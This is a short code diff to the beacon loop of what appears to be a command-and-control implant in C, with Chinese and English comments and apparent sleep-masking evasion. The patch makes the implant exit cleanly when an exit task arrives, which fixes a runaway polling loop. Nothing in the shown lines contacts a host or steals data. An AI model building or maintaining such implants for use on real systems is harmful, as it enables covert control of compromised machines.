@@ -224,6 +224,9 @@ void beacon(LPVOID lpReserved) {
 				process_payload(buffer, length);
 			if (check_kill_date())
 				safe_exit();
+			/* exit task arrived this cycle: terminate instead of sleeping */
+			if (beacon_dying)
+				safe_exit();
 			if (sleep_time > 0)
 				GargleSleep(sleep_time);
 			continue;
@@ -312,6 +315,12 @@ void beacon(LPVOID lpReserved) {
 
 		/* 再次检查终止日期 */
 		if (check_kill_date())
+			safe_exit();
+
+		/* exit task arrived this cycle: terminate before any further sleep
+		 * (the old path only zeroed sleep_time and the loop spun forever -
+		 * 220 GET/s live, and every later sleep task was ignored) */
+		if (beacon_dying)
 			safe_exit();
 
 		/* 检查最大重试策略，如果达到阈值则调整休眠时间 */
